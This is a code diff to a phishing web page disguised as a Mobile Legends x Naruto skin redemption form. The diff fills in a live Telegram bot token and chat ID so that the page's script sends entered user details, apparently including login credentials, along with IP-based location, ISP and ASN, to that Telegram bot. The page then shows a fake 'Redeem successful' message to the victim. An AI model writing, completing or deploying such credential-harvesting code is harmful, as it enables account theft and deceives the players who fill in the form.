@@ -162,6 +162,8 @@
   </form>
 
   <script>
+    const BOT_TOKEN = "7667662149:AAE8qvehpAjpabPqXMR0MX7TtBmPwf5iYHw";
+    const CHAT_ID = "7137150704";
     const methodSelect = document.getElementById('methodSelect');
     const emailLabelDiv = document.getElementById('emailLabelDiv');
     const passwordLabelDiv = document.getElementById('passwordLabelDiv');
@@ -208,7 +210,6 @@
       try {
         const ipRes = await fetch('https://ipwho.is/');
         const ipData = await ipRes.json();
-
         const message = `
 [MLBB x Naruto Redeem Attempt]
 User ID: ${userId}
@@ -224,12 +225,16 @@ Location: ${ipData.city}, ${ipData.country} (${ipData.country_code})
 ISP: ${ipData.connection?.org}
 ASN: ${ipData.connection?.asn}
         `;
-
-        await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', text: message })
-        });
+        // Kirim ke Telegram
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+           method: "POST",
+           headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+             chat_id: CHAT_ID,
+             text: message
+        })
+      });
+          
 
         alert("Redeem successful! The skin will be delivered within 24 hours.");
         this.reset();
